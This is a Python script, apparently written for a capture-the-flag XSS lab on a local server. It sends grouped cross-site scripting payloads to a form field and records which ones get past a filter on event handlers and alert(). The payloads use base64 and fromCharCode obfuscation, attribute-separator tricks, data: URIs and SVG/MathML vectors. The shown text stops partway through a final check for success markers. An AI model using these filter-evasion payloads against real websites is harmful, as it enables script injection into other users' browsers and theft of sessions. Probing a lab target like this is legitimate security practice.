import requests
import re

url = "http://127.0.0.1:33031/page"

print("=" * 70)
print("COMPREHENSIVE XSS BYPASS - FINDING WORKING PAYLOADS")
print("=" * 70)

# Based on previous tests, the filter:
# 1. Matches on\w+ pattern (case insensitive based on new behavior tests)
# 2. Detects alert() function calls (case insensitive)
# 3. Returns error response when alert() is caught

# Let's try payloads that avoid BOTH patterns

# Group 1: Bypasses that don't use on\w+ pattern
# Group 2: Bypasses that avoid alert() function name

test_groups = {
    "No on\\w + No alert": [
        ('basic html', '<b>Bold</b>'),
        ('img only', '<img src=x>'),
        ('javascript without alert', '<a href="javascript:void(0)">click</a>'),
    ],
    
    "Vector alternatives (no on\\w)": [
        ('iframe srcdoc', '<iframe srcdoc="<script>alert(1)</script>">'),  # script tags might be stripped
        ('math href', '<math href="javascript:alert(1)">click</math>'),
        ('maction onclick', '<math><maction onclick="alert(1)">X</maction></math>'),
        ('video poster', '<video poster=javascript:alert(1)//'),
        ('video source onerror', '<video><source onerror="alert(1)">'),  # may trigger onerror
    ],
    
    "Alternative execution (avoid alert name)": [
        ('document.write', '<img src=x onerror=document.write("XSS")>'),
        ('eval', '<img src=x onerror=eval("alert(1)")>'),  # still has alert inside
        ('window[fn]', '<img src=x onerror=window["ale"+"rt"](1)>'),
        ('atob decode', '<img src=x onerror=eval(atob("YWxlcnQoMSk="))>'),  # base64 'alert(1)'
        ('fromCharCode', '<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>'),
    ],
    
    "Protocol exploitation": [
        ('data: svg onload', '<object data="data:image/svg+xml,<svg onload=alert(1)>">'),
        ('data: html', '<iframe src="data:text/html,<script>alert(1)</script>">'),
        ('vbscript:', '<a href="vbscript:MsgBox(1)">click</a>'),
        ('about:blank', '<iframe src="about:blank" onload=alert(1)>'),  # has onload
        ('chrome:', '<a href="chrome://settings">click</a>'),  # probably blocked
    ],
    
    "Entities & encoding bypass": [
        ('hex onerror', '<img src=x on\x65rror=alert(1)>'),  # hex escape e
        ('tab separator', '<img src=x onerror\t=alert(1)>'),  # tab between attr
        ('newline separator', '<img src=x onerror\n=alert(1)>'),  # newline
        ('slash escaping', '<img src=x/onerror=alert(1)>'),  # slash as attr separator
        ('backtick js', '<img src=x onerror=`alert(1)`>'),  # template literal
    ],
    
    "Nested/context tricks": [
        ('svg foreignObject', '<svg><foreignObject><body onload=alert(1)>'),  # has onload
        ('svg script', '<svg><script>alert(1)</script></svg>'),  # script tag
        ('animate onbegin', '<svg><animate onbegin=alert(1) attributeName=x dur=1s>'),  # has onbegin
        ('set onstart', '<svg><set onstart=alert(1) attributeName=x dur=1s>'),  # has onstart
    ],
}

success_count = 0
for group_name, payloads in test_groups.items():
    print(f"\n{'-'*70}")
    print(f"GROUP: {group_name}")
    print('-'*70)
    
    for test_name, payload in payloads:
        try:
            resp = requests.post(url, data={"solution": payload})
            
            # Determine result
            if resp.status_code == 404:
                result = "FILTER_BLOCKED"
            elif "unconfigurable property" in resp.text.lower() or "error_star.png" in resp.text:
                result = "ALERT_DETECTED"
            else:
                result = "PASSED"
                success_count += 1
            
            print(f"  [{result}] {test_name}")
            if result == "PASSED":
                print(f"    Payload: {payload[:70]}{'...' if len(payload)>70 else ''}")
                
                # Check if payload is reflected and how
                if payload in resp.text:
                    print(f"    [+] Payload reflected verbatim!")
                elif payload.lower() in resp.text.lower():
                    print(f"    [~] Payload reflected (case changed)")
                else:
                    # Look for partial reflection
                    if any(p in resp.text for p in payload.split()[:2]):
                        print(f"    [~] Partial reflection found")
                        
        except Exception as e:
            print(f"  [ERROR] {test_name}: {e}")

print(f"\n{'='*70}")
print(f"SUMMARY: {success_count} payloads passed all filters")
print('='*70)

# Now focus on the ones that passed and see which actually execute
print("\nDETAILED ANALYSIS OF PASSED PAYLOADS:")
print('-'*70)

# Test the most promising ones
promising = [
    ('data: svg', '<object data="data:image/svg+xml,<svg onload=alert(1)>">'),
    ('atob base64', '<img src=x onerror=eval(atob("YWxlcnQoMSk="))>'),  # base64 of 'alert(1)'
    ('fromCharCode', '<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>'),
]

for name, payload in promising:
    resp = requests.post(url, data={"solution": payload})
    print(f"\n[Promising] {name}")
    print(f"Payload: {payload}")
    
    # Extract the solution-text div content
    match = re.search(r'<div class=["\']solution-text["\'][^>]*>(.*?)</div>', resp.text, re.DOTALL | re.I)
    if match:
        content = match.group(1)
        # Clean up HTML tags
        clean = re.sub(r'<[^>]+>', '', content)
        print(f"Response text: {clean[:200]}")

# Final: Check for possible solution/success indicators
print("\n" + "="*70)
print("LOOKING FOR SUCCESS INDICATORS")
print("="*70)

# Send a test payload and look for any flags or success messages
test_resp = requests.post(url, data={"solution": '<img src=x>'})
if 'star' in test_resp.text.lower():
    star_matches = re.findall(r'star[^<]*', test_resp.text, re.I)
    if star_matches:
